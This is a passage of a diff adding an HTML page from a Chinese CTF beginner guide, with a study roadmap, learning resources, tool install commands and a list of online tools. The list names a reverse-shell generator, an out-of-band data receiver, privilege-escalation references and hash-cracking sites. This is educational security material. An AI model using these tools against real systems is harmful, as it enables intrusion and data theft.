+└── 完成 OverTheWire: Bandit (全部关卡)
+
+第 3-4 周: Web 安全入门
+├── 学习 OWASP Top 10
+├── 搭建 DVWA 练习
+├── 学习 Burp Suite 使用
+├── 完成 TryHackMe: Web Fundamentals
+└── PicoCTF Web 题目 (Easy)
+
+第 5-6 周: 拓展方向
+├── Crypto: CryptoHack 入门课程
+├── Forensics: 文件分析基础, Wireshark
+├── Reverse: 学习 x86 汇编基础, Ghidra 入门
+└── 参加一次在线 CTF 比赛
+
+第 7-8 周: 深入学习
+├── 选择 1-2 个主攻方向深入
+├── HackTheBox / TryHackMe 进阶靶机
+├── 阅读他人 Writeup 学习思路
+└── 组队参加 CTF
+
+持续提升:
+├── 每周至少参加一次 CTF
+├── 写自己的 Writeup 总结
+├── 关注安全社区和最新漏洞
+└── 向更高难度挑战 (HackTheBox Pro Labs)</div>
+
+    <h3>8.1 每个方向的学习资源</h3>
+    <table>
+      <thead>
+        <tr><th>方向</th><th>入门书籍/课程</th><th>进阶资源</th></tr>
+      </thead>
+      <tbody>
+        <tr><td>Web</td><td>《Web Hacking 101》, PortSwigger Web Security Academy</td><td>Real-world bug bounty reports, HackerOne Hacktivity</td></tr>
+        <tr><td>Crypto</td><td>CryptoHack, 《密码编码学与网络安全》</td><td>Cryptopals challenges, SageMath</td></tr>
+        <tr><td>Reverse</td><td>《逆向工程核心原理》, crackmes.one</td><td>《加密与解密》, Flare-On challenges</td></tr>
+        <tr><td>Pwn</td><td>《Hacking: The Art of Exploitation》</td><td>how2heap, pwn.college</td></tr>
+        <tr><td>Forensics</td><td>《数字取证技术》, CyberDefenders</td><td>SANS DFIR courses, Volatility contests</td></tr>
+      </tbody>
+    </table>
+
+    <!-- Section 9: Tools -->
+    <h2 id="tools">9. CTF 必备工具清单</h2>
+
+    <h3>9.1 通用工具</h3>
+    <table>
+      <thead>
+        <tr><th>工具</th><th>用途</th><th>安装/获取方式</th></tr>
+      </thead>
+      <tbody>
+        <tr><td>CyberChef</td><td>编码/解码/加密/分析瑞士军刀</td><td>在线: gchq.github.io/CyberChef</td></tr>
+        <tr><td>Python 3</td><td>脚本编写、自动化</td><td><code>apt install python3</code></td></tr>
+        <tr><td>pwntools</td><td>CTF 专用 Python 框架</td><td><code>pip install pwntools</code></td></tr>
+        <tr><td>Docker</td><td>快速部署环境和工具</td><td><code>apt install docker.io</code></td></tr>
+        <tr><td>Kali Linux</td><td>预装所有安全工具的发行版</td><td>VM/WSL/Native</td></tr>
+      </tbody>
+    </table>
+
+    <h3>9.2 分方向工具</h3>
+
+    <pre><code># === 一键安装 CTF 工具集 ===
+
+# Web 方向
+sudo apt install -y burpsuite sqlmap nikto dirb gobuster
+pip install requests beautifulsoup4
+
+# Crypto 方向
+pip install pycryptodome sympy gmpy2
+sudo apt install -y sage john hashcat
+
+# Forensics 方向
+sudo apt install -y binwalk foremost exiftool steghide
+sudo apt install -y wireshark tshark
+pip install volatility3
+
+# Reverse 方向
+sudo apt install -y gdb
+# 安装 pwndbg
+git clone https://github.com/pwndbg/pwndbg ~/pwndbg && cd ~/pwndbg && ./setup.sh
+# Ghidra: 从 github.com/NationalSecurityAgency/ghidra 下载
+
+# Pwn 方向
+pip install pwntools ropper
+sudo apt install -y gcc-multilib
+# ROPgadget
+pip install ROPgadget
+
+# === Docker 快速环境 ===
+# CTF 全套工具
+docker pull ctftraining/base_image_2019
+
+# DVWA
+docker run -d -p 80:80 vulnerables/web-dvwa
+
+# WebGoat
+docker run -d -p 8080:8080 webgoat/webgoat</code></pre>
+
+    <h3>9.3 在线工具汇总</h3>
+    <table>
+      <thead>
+        <tr><th>工具/网站</th><th>URL</th><th>用途</th></tr>
+      </thead>
+      <tbody>
+        <tr><td>CyberChef</td><td>gchq.github.io/CyberChef</td><td>万能编解码</td></tr>
+        <tr><td>dcode.fr</td><td>www.dcode.fr</td><td>古典密码破解</td></tr>
+        <tr><td>factordb.com</td><td>factordb.com</td><td>大整数分解查询</td></tr>
+        <tr><td>crackstation.net</td><td>crackstation.net</td><td>Hash 反查</td></tr>
+        <tr><td>Webhook.site</td><td>webhook.site</td><td>接收外带数据</td></tr>
+        <tr><td>RequestBin</td><td>requestbin.com</td><td>HTTP 请求捕获</td></tr>
+        <tr><td>regex101.com</td><td>regex101.com</td><td>正则表达式测试</td></tr>
+        <tr><td>GTFOBins</td><td>gtfobins.github.io</td><td>Linux 提权参考</td></tr>
+        <tr><td>ExploitDB</td><td>exploit-db.com</td><td>漏洞利用数据库</td></tr>
+        <tr><td>RevShells</td><td>revshells.com</td><td>反弹 Shell 生成器</td></tr>
+      </tbody>
+    </table>
+
+    <div class="info-box danger">
+      <div class="box-title">CTF 竞赛道德准则</div>
+      <ul>
+        <li><strong>不要攻击比赛基础设施</strong>（评分服务器、其他队伍等）</li>
+        <li><strong>比赛期间不要公开 Writeup 或 Flag</strong></li>
+        <li><strong>不要使用他人的解题成果</strong>（除非是团队合作）</li>
+        <li><strong>赛后积极分享 Writeup</strong>，为社区做贡献</li>
+        <li><strong>尊重出题者</strong>，如发现非预期解及时通报</li>
+      </ul>
+    </div>
+
+    <div class="info-box success">
+      <div class="box-title">给新手的建议</div>
+      <ul>
+        <li><strong>不要害怕失败</strong>：比赛中解不出题是正常的，重要的是赛后学习 Writeup</li>
+        <li><strong>记录笔记</strong>：建立自己的知识库，记录解题思路和工具用法</li>
+        <li><strong>找队伍</strong>：CTF 是团队运动，不同方向的队友互补很重要</li>
+        <li><strong>保持耐心</strong>：安全学习是长期积累的过程，不要急于求成</li>
+        <li><strong>动手实践</strong>：看十遍不如做一遍，多动手比什么都重要</li>
+      </ul>
+    </div>
+
+    <div class="nav-footer">
+      <a href="01_渗透测试工具.html">← 上一篇: 渗透测试工具全指南</a>
+      <span></span>
+    </div>
+  </main>
+</div>
+</body>
+</html>
